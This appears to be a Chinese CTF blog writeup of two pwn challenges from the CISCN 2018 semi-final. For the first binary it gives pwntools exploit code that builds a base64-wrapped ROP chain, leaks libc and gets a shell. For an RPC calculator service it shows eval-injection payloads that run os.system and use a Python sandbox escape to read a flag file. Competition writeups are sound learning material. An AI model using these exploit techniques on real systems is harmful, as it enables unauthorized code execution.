---
layout: article
title: ciscn 华南区半决赛的两道 pwn 题 writeup 
key: 20180612
tags:
  - CTF
  - PWN
typora-root-url: ..\
---

初学 pwn 没多久，功力还不够，所以只能刚出两道比较简单的 pwn 题。。

<!--more-->

## mirage_game (pwn4)

因为这个题是第一天放出来的，所以摆在 pwn1 的前面。在做这题之前我一直在刚 web7，一道有 backdoor.so 的 Web 题。。。搞了好久没搞出。于是去看看队友的 pwn 搞得怎样，一看发现事情并不简单，然后就转去搞 pwn 不管 Web 了（PS. 打完和别人交流发现其实 web7 快要出的了，血崩！）

好了，废话不多说。把 pwn4 拖进 IDA，F5 后简单浏览下 main 函数，发现有一个类型号为66的分支，调用了一个函数名很神奇的函数，最终进去就发现这就是漏洞点。

```c
__int64 sfadkjf()
{
  char dest; // [rsp+0h] [rbp-30h]
  char *src; // [rsp+20h] [rbp-10h]
  char *v3; // [rsp+28h] [rbp-8h]

  // ...
  v3 = malloc(0x100uLL);
  src = malloc(0x100uLL);
  // ...
  gets(v3, 0LL);
  base64_decode(v3, src);
  memcpy(&dest, src, 0x80uLL);
  // ...
}
```

但是这个漏洞并不像普通的栈溢出漏洞，它是把输入的内容进行 base64 解码之后，再复制到栈上，所以就不能简单的用 `pattern create 200` 来计算要溢出多少个字节。稍微棘手一点点，但还是不难。

首先向往常那样用 `pattern create 200` 创建200个每4字符互不相同的字符串，对它进行 base64 编码，再输入进 pwn4。然后用 gdb attach 上去调试，刚开始不知道出现在什么函数，不慌，一路 next 过去，就逐渐会跳回 sfadkjf 函数了。在 memcpy 之前记住栈上保存函数返回地址的地址，等字符串复制完之后找一下那里的字符串是什么，用 `pattern offset` 算一下就可以得出需要溢出56个字节了。接下来就是普通的 ROP 了。

因为 write 函数的参数比较难满足，所以用了 puts 函数来泄漏地址。

```python
# 泄漏 puts 的地址
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
prdi_ret = 0x0000000000403383 # ROPgadget --binary ./mirage_game --only "pop|ret" | grep "pop rdi"
sfadkjf  = 0x000000000040173C

payload = "A" * 56 + p64(prdi_ret) + p64(puts_got) + p64(puts_plt) + p64(sfadkjf)
payload = b64encode(payload)
io.sendline(payload)
io.recvuntil("t!\n")
result = io.recv(8)
io.recv()
puts_addr = int('0x' + hex(u64(result))[6:], 16)
print 'puts_addr ', hex(puts_addr)
```

需要注意的是，因为 sfadkjf 接收到 payload 之后会来一个 base64 解码，所以在发 payload 之前要先 base64 编码。拿到了 puts 的地址之后，就可以计算 system 和 "/bin/sh" 字符串的地址了，然后就可以 getshell 之后 getflag。

```python
# 计算 system 和 binsh 的地址，然后 getshell
base   = puts_addr - libc.symbols['puts']
system = base + libc.symbols['system']
binsh  = base + libc.search('/bin/sh').next()
print "system is ",  hex(system)
print "binsh is  ",  hex(binsh)

payload = "A" * 56 + p64(prdi_ret) + p64(binsh) + p64(system) + p64(prdi_ret) + p64(binsh) + p64(system)
payload = b64encode(payload)
io.sendline(payload)
print io.recv()

io.interactive()
```

[题目源文件下载地址](/assets/posts/2018-06-12-ciscn2018-semi-final-pwn-writeup/mirage_game.zip)

## pwn (pwn1)

第二天的 getflag 阶段只有3个小时，猜测题目应该不会很难，结果打脸了。这道 pwn1 好不容易才找到漏洞点，然而想不出怎么 patch，另一道 pwn6 直接就找不到漏洞点。。真的太菜了

这个的漏洞有点难定位（感觉我有可能是非预期解），丢进 IDA 看一下 Strings 窗口发现有一个字符串是 `"python -c 'print eval(\"%s\")'"` ，追踪上去，发现是位置在 4038F6 的函数使用了这个字符串。继续追踪上去就可以知道当类型号为3的时候，会进入到这函数里面。（后来才发现这是一个完全按照主办方说明写的 RPC 服务）运行这个 python 命令是为了把 python 当作一个计算器，实现主办方要求的表达式计算，但是却能被用来执行指令。

看一下各类型的含义：

>### 发送包
>
>#### connect -- type = 0
>
>连接包，在建立连接时确认连接建立成功，表示开启服务，没有自定义域，服务器收到返回 done 包。
>
>#### declare -- type = 1
>
>分配消息队列包，向服务器请求一个消息队列，分配一个消息队列 id 作为返回，包含在 result 包中。
>
>#### retrieve -- type = 2
>
>获取消息包，需要依次提供 `key` 和 `corr_id` 两个自定义域，均为字符串，域长度为32位以内。按照 key 所对应的消息队列，试图获取 `corr_id` 请求得到的结果。服务器收到之后确认 key 所对应的消息队列目前的队首消息是否为 `corr_id` 请求的结果，如果不是则返回 unavailable 包，否则弹出队首结果并且返回 result 。
>
>#### call -- type = 3
>
>发起请求包，依次提供 `reply_to`，`corr_id` 和 `expr` 三个域，同样为长度32位以内，均为字符串。发起一个请求，id 为 `corr_id` ，表达式内容为 `expr`，返回结果加入 `reply_to` 作为 key 所对应的消息队列。 成功返回 done 包。
>
>#### close -- type = 4
>
>无自定义域，停止本次连接，服务器接收到该包可以断开连接。

所以思路就有了，首先用类型号1，来获取一个消息队列 id 。（因为不涉及到溢出，所以加了个全局的 `context.endian = 'big'` ，省得后面每次都要写）

```python
# get corr_id
payload = b'RPCM' + p32(12) + p32(1)
io.send(payload)
corr_id = io.recv()[16:]
print corr_id
```

然后再用类型号3，按照指定格式发送需要计算的表达式，并指定存计算结果的 reply_to 为 “reply001”，这里把表达式替换成 python 命令，让 eval 去执行。

```python
# send expr
payload = p32(36) + corr_id + p32(8) + b'reply001'
payload += p32(34) + b'__import__(\\\"os\\\").system(\\\"pwd\\\")'
#payload += p32(16) + b'0x1000+0x25+0.11'
payload = b'RPCM' + p32(len(payload)+12) + p32(3) + payload
io.send(payload)
print io.recv()
```

最后用类型号2，使用之前的 corr_id 来获取计算结果，即命令运行结果。

```python
# get calc result
payload = p32(36) + corr_id + p32(8) + b'reply001'
payload = b'RPCM' + p32(len(payload)+12) + p32(2) + payload
io.send(payload)
print io.recv()
```

在本地跑发现，执行命令的时候，命令中间不能有空格，不管怎么转义都不行。。于是向队友求助，他丢给我一个 ciscn 初赛时候 python 沙箱的 payload，一跑通了，愉快地 getflag ~

```python
payload += p32(75) + b'().__class__.__bases__[0].__subclasses__()[40](\\\"/home/ciscn/flag\\\").read()'
```

[题目源文件下载地址](/assets/posts/2018-06-12-ciscn2018-semi-final-pwn-writeup/pwn.zip)

## 其他需要注意的

这次的 pwn 题都是 RPC 服务，协议格式是：

```
+----------+-----------+---------+------
| magic(4) | length(4) | type(4) | ...
+----------+-----------+---------+------
```

其中 length 和 type 是大端序，所以用 pwntools 打包数据时，要指定大端，如 `p32(26, endian='big') ` ，刚开始没考虑到这一点，折腾了好久。但是在进行栈溢出的时候，因为目标机器是 Linux 环境，用的是小端序，所以要切换回来。最好是按协议发的包才临时在后面加上个 `endian='big'` 。
